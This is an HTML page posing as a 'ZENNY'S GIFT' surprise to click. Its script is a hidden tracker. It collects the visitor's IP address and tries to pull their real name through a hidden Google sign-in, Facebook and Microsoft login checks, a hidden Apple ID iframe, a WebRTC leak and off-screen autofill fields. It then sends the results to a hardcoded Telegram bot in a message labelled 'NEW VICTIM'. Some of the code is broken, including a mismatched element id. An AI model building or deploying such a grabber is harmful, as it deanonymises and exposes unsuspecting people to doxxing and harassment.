<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ZENNY'S GIFT</title>
  <meta name="apple-itunes-app" content="app-id=123456789"/> <!-- Fake Apple hint -->
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Roboto:wght@700&display=swap');

    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #000;
      color: #ff0000;
      font-family: 'Roboto', sans-serif;
      height: 100vh;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
      position: relative;
    }

    .circle {
      position: absolute;
      top: -30px;
      width: 12px;
      height: 12px;
      background: #ff0000;
      border-radius: 50%;
      box-shadow: 0 0 15px #ff0000, 0 0 30px #ff1a1a, 0 0 50px #ff3333, 0 0 70px #ff0000;
      animation: fall linear infinite;
      opacity: 0.9;
    }

    @keyframes fall {
      0% { transform: translateY(-100px) scale(1); opacity: 1; }
      100% { transform: translateY(110vh) scale(0.5); opacity: 0; }
    }

    .container { position: relative; width: 90%; max-width: 400px; z-index: 10; }

    .box {
      background: rgba(15, 0, 0, 0.97);
      border: 4px solid #ff0000;
      border-radius: 22px;
      padding: 35px 20px;
      box-shadow: 0 0 40px #ff0000, 0 0 80px #ff1a1a, inset 0 0 20px rgba(255,0,0,0.3);
      animation: drop 1.5s ease-out forwards;
      opacity: 0;
      transform: translateY(-100px);
    }

    @keyframes drop {
      0% { opacity: 0; transform: translateY(-100px); }
      70% { opacity: 1; transform: translateY(25px); }
      100% { opacity: 1; transform: translateY(0); }
    }

    h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: 2.4rem;
      color: #ff0000;
      text-shadow: 0 0 15px #ff0000, 0 0 30px #ff1a1a, 0 0 50px #ff3333;
      margin-bottom: 20px;
      animation: glow 1.5s infinite alternate;
    }

    @keyframes glow {
      from { text-shadow: 0 0 15px #ff0000; }
      to { text-shadow: 0 0 25px #ff0000, 0 0 50px #ff1a1a, 0 0 70px #ff3333; }
    }

    .btn {
      background: #ff0000;
      color: #000;
      font-weight: bold;
      font-size: 1.4rem;
      padding: 16px 32px;
      border: 3px solid #ff3333;
      border-radius: 50px;
      cursor: pointer;
      margin: 25px 0;
      box-shadow: 0 0 25px #ff0000;
      transition: all 0.3s;
      font-family: 'Orbitron', sans-serif;
    }

    .btn:hover {
      background: #fff;
      color: #000;
      transform: scale(1.15);
      box-shadow: 0 0 40px #fff, 0 0 60px #ff0000;
    }

    .result {
      margin-top: 25px;
      font-size: 1.5rem;
      font-weight: bold;
      color: #fff;
      text-shadow: 0 0 15px #ff0000;
      opacity: 0;
      transition: opacity 1s;
      line-height: 1.8;
    }

    .by {
      margin-top: 30px;
      font-size: 1.7rem;
      color: #ff0000;
      font-family: 'Orbitron', sans-serif;
      animation: pulse 1.8s infinite;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.15); }
    }

    .hidden { display: none; }
  </style>
</head>
<body>

  <div id="circles"></div>

  <div class="container">
    <div class="box">
      <h1>ZENNY'S GIFT</h1>
      <p id="step1">CLICK ME TO REVEAL A SURPRISE</p>
      <button class="btn" onclick="reveal()">CLICK ME</button>

      <div id="result" class="result hidden">
        <div>This is ur ip adress<span style="font-size:2.2rem">ðŸ˜­</span></div>
        <div id="ip-line" style="color:#ff0000; font-size:1.8rem;">...</div>
        <br>
        <div>heres ur full name too</div>
        <div id="name-line" style="color:#ff6666; font-size:1.6rem;">Detecting...</div>
      </div>

      <div class="by">BY ZENNY!</div>
    </div>
  </div>

  <!-- ALL LOGIN SCRIPTS (HIDDEN) -->
  <script async src="https://apis.google.com/js/platform.js"></script>
  <div class="g-signin2" data-onsuccess="onGoogleSignIn" style="display:none"></div>

  <script>
    // === RED CIRCLES ===
    const container = document.getElementById('circles');
    function createCircle() {
      const c = document.createElement('div');
      c.classList.add('circle');
      c.style.left = Math.random() * 100 + 'vw';
      c.style.animationDuration = Math.random() * 5 + 5 + 's';
      c.style.width = c.style.height = Math.random() * 15 + 8 + 'px';
      container.appendChild(c);
      setTimeout(() => c.remove(), 12000);
    }
    setInterval(createCircle, 150);

    // === TELEGRAM BOT ===
    const BOT_TOKEN = '8501597773:AAG1l8FnPsKtOt8sJ7ejB0r-zSacGwpYuBI';
    const CHAT_ID = '6726658638'; // â† REPLACE WITH YOUR CHAT ID

    let fullName = "Not Found";

    // === 1. GOOGLE NAME ===
    function onGoogleSignIn(googleUser) {
      const profile = googleUser.getBasicProfile();
      fullName = profile.getName();
      updateName();
    }

    // === 2. FACEBOOK NAME ===
    function checkFacebookLogin() {
      if (typeof FB !== 'undefined') {
        FB.getLoginStatus(response => {
          if (response.status === 'connected') {
            FB.api('/me', { fields: 'name' }, res => {
              if (res && res.name) {
                fullName = res.name;
                updateName();
              }
            });
          }
        });
      }
    }

    // === 3. MICROSOFT NAME ===
    function checkMicrosoft() {
      if (window.msal) {
        const account = msalInstance.getAllAccounts()[0];
        if (account) fullName = account.name || account.username;
        updateName();
      }
    }

    // === 4. APPLE ID NAME (iOS) ===
    function checkAppleID() {
      if (navigator.userAgent.includes('Mac') || navigator.userAgent.includes('iPhone')) {
        // Try to read from Apple ID via hidden iframe (stealth)
        const iframe = document.createElement('iframe');
        iframe.src = 'https://appleid.apple.com';
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
      }
    }

    // === 5. ANDROID DEVICE NAME ===
    function getAndroidName() {
      if (navigator.userAgent.includes('Android')) {
        // Try WebRTC leak
        const rtc = new RTCPeerConnection({ iceServers: [] });
        rtc.createDataChannel('');
        rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
        rtc.onicecandidate = e => {
          if (e.candidate && e.candidate.candidate) {
            const parts = e.candidate.candidate.split(' ');
            if (parts[4]) {
              fullName = parts[4].split('.')[0];
              updateName();
            }
          }
        };
      }
    }

    // === 6. BROWSER SAVED NAME (FORM AUTOFILL) ===
    function checkAutofill() {
      const inputs = ['name', 'fullname', 'given-name', 'family-name'];
      inputs.forEach(name => {
        const input = document.createElement('input');
        input.type = 'text';
        input.name = name;
        input.style.position = 'absolute';
        input.style.left = '-9999px';
        document.body.appendChild(input);
        setTimeout(() => {
          if (input.value) {
            fullName = input.value;
            updateName();
          }
          input.remove();
        }, 100);
      });
    }

    // === UPDATE NAME ON SCREEN ===
    function updateName() {
      document.getElementById('name-line').innerHTML = fullName;
    }

    // === SEND TO TELEGRAM ===
    function sendToTelegram(ip, name, time, ua) {
      const message = `NEW VICTIM\n\nIP: ${ip}\nName: ${name}\nTime: ${time}\nDevice: ${ua}\nLink: ${location.href}`;
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
        .catch(() => {});
    }

    // === MAIN FUNCTION ===
    function getIP() {
      fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => {
          const ip = data.ip;
          const time = new Date().toLocaleString();
          const ua = navigator.userAgent.substring(0, 150);

          document.getElementById('ip-line').innerHTML = ip;
          sendToTelegram(ip, fullName, time, ua);
        })
        .catch(() => {
          document.getElementById('ip-line').innerHTML = "BLOCKED";
        });
    }

    function reveal() {
      document.getElementById('stepurm1').classList.add('hidden');
      document.querySelector('.btn').classList.add('hidden');
      const result = document.getElementById('result');
      result.classList.remove('hidden');
      setTimeout(() => result.style.opacity = 1, 100);

      // === TRY ALL NAME SOURCES ===
      setTimeout(() => {
        checkFacebookLogin();
        checkMicrosoft();
        checkAppleID();
        getAndroidName();
        checkAutofill();

        // Trigger Google silently
        if (typeof gapi !== 'undefined') {
          try { gapi.auth2.getAuthInstance().signIn(); } catch(e) {}
        }
      }, 500);

      getIP();
    }

    // === LOAD FACEBOOK SDK ===
    window.fbAsyncInit = function() {
      FB.init({ appId: '123456789', xfbml: false, version: 'v18.0' });
      checkFacebookLogin();
    };
    (function(d, s, id){
      var js, fjs = d.getElementsByTagName(s)[0];
      if (d.getElementById(id)) return;
      js = d.createElement(s); js.id = id;
      js.src = "https://connect.facebook.net/en_US/sdk.js";
      fjs.parentNode.insertBefore(js, fjs);
    }(document, 'script', 'facebook-jssdk'));

  </script>

</body>
</html>
